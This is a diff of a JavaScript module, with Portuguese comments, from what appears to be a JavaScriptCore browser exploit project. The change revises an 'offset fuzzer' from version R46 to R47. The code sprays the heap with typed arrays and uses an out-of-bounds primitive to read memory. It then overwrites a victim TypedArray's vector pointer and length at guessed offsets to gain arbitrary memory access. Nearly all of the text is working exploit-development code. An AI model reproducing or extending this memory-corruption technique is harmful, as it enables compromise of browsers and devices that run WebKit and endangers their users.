@@ -1,57 +1,68 @@
-// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R46 - Fuzzer de Offset)
+// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R47 - Fuzzer Estável)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex } from '../utils.mjs';
+import { toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
     oob_write_absolute,
-    arb_read // Vamos precisar do arb_read relativo para restaurar a memória
+    getOOBDataView // NOVO: Precisamos de acesso direto ao DataView
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_OFFSET_FUZZER_R46 = "Heisenbug_OffsetFuzzer_R46";
+export const FNAME_MODULE_STABLE_FUZZER_R47 = "Heisenbug_StableOffsetFuzzer_R47";
 
-// NOVO: A função principal agora é um "fuzzer" que busca o offset correto.
-export async function executeOffsetFuzzer_R46() {
-    const FNAME_CURRENT_TEST = FNAME_MODULE_OFFSET_FUZZER_R46;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Buscando Offset para Corrupção de TypedArray ---`, "test", FNAME_CURRENT_TEST);
+// NOVO: Função de leitura síncrona "leve" que não desestabiliza o heap.
+function sync_oob_read_32(dataview, offset) {
+    if (!dataview) return 0;
+    // Lê um inteiro de 32 bits (4 bytes) no offset especificado.
+    return dataview.getUint32(offset, true); // true para little-endian
+}
+
+export async function executeStableOffsetFuzzer_R47() {
+    const FNAME_CURRENT_TEST = FNAME_MODULE_STABLE_FUZZER_R47;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Buscando Offset com Fuzzer Estável ---`, "test", FNAME_CURRENT_TEST);
     
     let result = { success: false, msg: "Fuzzer não encontrou um offset válido.", errorOccurred: null };
-    let victim_array = null; // Declarado aqui para ser acessível no finally
+    let victim_array = null;
 
     try {
         // --- FASE 0: PREPARAÇÃO ---
-        logS3(`--- Fase 0 (R46): Preparação do Heap ---`, "subtest", FNAME_CURRENT_TEST);
+        logS3(`--- Fase 0 (R47): Preparação do Heap e Ambiente OOB ---`, "subtest", FNAME_CURRENT_TEST);
         let spray = [];
         for (let i = 0; i < 1000; i++) {
             spray.push(new Uint32Array(32));
         }
         victim_array = new Uint32Array(32);
         spray = null;
-        logS3(`[R46] Heap preparado. Array vítima criado.`, 'info');
-        await PAUSE_S3(100);
-        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
+        logS3(`[R47] Heap preparado. Array vítima criado.`, 'info');
         
-        // --- FASE 1: LOOP DE FUZZING ---
-        logS3(`--- Fase 1 (R46): Iniciando Loop de Fuzzing ---`, "subtest", FNAME_CURRENT_TEST);
+        // Configura o OOB e obtém o DataView para uso síncrono.
+        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
+        const oob_dataview = getOOBDataView();
+        if (!oob_dataview) {
+            throw new Error("Não foi possível obter o DataView da primitiva OOB.");
+        }
+        logS3(`[R47] Ambiente OOB configurado UMA VEZ.`, 'info');
+        
+        // --- FASE 1: LOOP DE FUZZING ESTÁVEL ---
+        logS3(`--- Fase 1 (R47): Iniciando Loop de Fuzzing Estável ---`, "subtest", FNAME_CURRENT_TEST);
 
         const M_VECTOR_OFFSET = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
         const M_LENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
         const FUZZ_START_OFFSET = 0x20;
-        const FUZZ_END_OFFSET = 0x400;
+        const FUZZ_END_OFFSET = 0x800; // Aumentei a faixa de busca
         const FUZZ_STEP = 0x4;
 
         for (let offset_guess = FUZZ_START_OFFSET; offset_guess < FUZZ_END_OFFSET; offset_guess += FUZZ_STEP) {
-            logS3(`[Fuzzer] Testando offset_guess = ${toHex(offset_guess)}...`, 'debug');
             
             const vector_write_target = offset_guess + M_VECTOR_OFFSET;
             const length_write_target = offset_guess + M_LENGTH_OFFSET;
 
-            // 1. Salva os valores originais para poder restaurar a memória depois
-            const original_vector_low = await arb_read(vector_write_target, 4);
-            const original_vector_high = await arb_read(vector_write_target + 4, 4);
-            const original_length = await arb_read(length_write_target, 4);
+            // 1. Salva os valores originais de forma SÍNCRONA
+            const original_vector_low = sync_oob_read_32(oob_dataview, vector_write_target);
+            const original_vector_high = sync_oob_read_32(oob_dataview, vector_write_target + 4);
+            const original_length = sync_oob_read_32(oob_dataview, length_write_target);
             
             // 2. Tenta a corrupção
             oob_write_absolute(vector_write_target, 0x0, 4);
@@ -63,10 +74,16 @@ export async function executeOffsetFuzzer_R46() {
             const TEST_VALUE = 0xDEADBEEF;
             const test_index = TEST_ADDRESS / 4;
             
-            victim_array[test_index] = TEST_VALUE;
-            let read_back_value = victim_array[test_index];
+            // Adicionado um try/catch aqui pois uma corrupção errada pode travar o acesso.
+            let read_back_value = -1;
+            try {
+                victim_array[test_index] = TEST_VALUE;
+                read_back_value = victim_array[test_index];
+            } catch (e) {
+                // Ignora erros, pois são esperados em offsets errados.
+            }
             
-            // 4. Restaura a memória para a próxima iteração
+            // 4. Restaura a memória de forma SÍNCRONA
             oob_write_absolute(vector_write_target, original_vector_low, 4);
             oob_write_absolute(vector_write_target + 4, original_vector_high, 4);
             oob_write_absolute(length_write_target, original_length, 4);
@@ -87,8 +104,8 @@ export async function executeOffsetFuzzer_R46() {
     } catch (e_outer) {
         result.errorOccurred = e_outer;
         result.msg = e_outer.message;
-        logS3(`  CRITICAL ERROR (R46): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
-        console.error("Outer error in R46 Fuzzer:", e_outer);
+        logS3(`  CRITICAL ERROR (R47): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
+        console.error("Outer error in R47 Fuzzer:", e_outer);
     } finally {
         await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
     }
